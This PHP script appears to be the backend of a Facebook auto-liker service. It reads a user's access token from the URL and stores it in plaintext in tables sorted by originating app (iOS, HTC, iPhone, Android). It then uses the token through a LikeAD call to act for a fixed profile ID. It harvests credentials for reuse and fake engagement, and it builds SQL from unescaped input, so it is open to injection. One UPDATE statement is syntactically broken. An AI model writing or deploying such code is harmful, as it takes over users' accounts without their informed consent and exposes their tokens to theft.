<?php
set_time_limit(0);
require("../_cnF/_star_cn_F.php");
require("../_cnF/_star_funC.php");
	$token = $_GET['token'];
	if($token){
		$me = me($token);
		if($me['id']&&(!ereg('@tfbnw.net',$me['email']))&&(!ereg('CAAC',$token))){
			$tk = checktk($token);
			$star = @mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM `taikhoan` WHERE `idfb` = $me[id];");
			if(mysqli_num_rows($star) < 1){
				$time = time();
				@mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO taikhoan SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `time` = '" . $time . "', `vnd` = '5000' ");
			}
			$rows = null;
			$result = @mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokenvip WHERE idfb = '" . $me['id'] . "'");
			if($result){
				$rows = mysqli_fetch_array($result, MYSQLI_ASSOC);
				if(mysqli_num_rows($result) > 1){
					@mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokenvip WHERE idfb='" . $me['id'] . "' ");
				}
			}
			if(!$rows){
				@mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenvip SET `idfb` = '" . $me['id'] . "',`ten` = '" . $me['name'] . "',`token` = '" . $token . "'");
			}
			else{
				@mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenvip SET `token` = '" . $token . "',  WHERE `id` = " . $rows['id'] . "");
			}
			if($tk['id'] == '165907476854626'){
				$row = null;
				$result = @mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokenios WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysqli_fetch_array($result, MYSQLI_ASSOC);
					if(@mysqli_num_rows($result) > 1){
						@mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokenios WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100004294419791', $token);
				if(!$row){
					@mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenios SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenios SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysqli_close($connection);
			}
			if($tk['id'] == '41158896424'){
				$row = null;
				$result = @mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokenhtc WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysqli_fetch_array($result, MYSQLI_ASSOC);
					if(@mysqli_num_rows($result) > 1){
						@mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokenhtc WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100004294419791', $token);
				if(!$row){
					@mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenhtc SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenhtc SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysqli_close($connection);
			}
			if($tk['id'] == '6628568379'){
				$row = null;
				$result = @mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokeniphone WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysqli_fetch_array($result, MYSQLI_ASSOC);
					if(@mysqli_num_rows($result) > 1){
						@mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokeniphone WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100004294419791', $token);
				if(!$row){
					@mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokeniphone SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokeniphone SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysqli_close($connection);
			}
			if($tk['id'] == '350685531728'){
				$row = null;
				$result = @mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokenandroid WHERE idfb = '" . $me[id] . "' ");
				if($result){
					$row = @mysqli_fetch_array($result, MYSQLI_ASSOC);
					if(@mysqli_num_rows($result) > 1){
						@mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokenandroid WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' ");
					}
				}
				LikeAD('100004294419791', $token);
				if(!$row){
					@mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenandroid SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' ");
				}
				else{
					@mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenandroid SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " ");
				}
				mysqli_close($connection);
			}
		}
	}
?>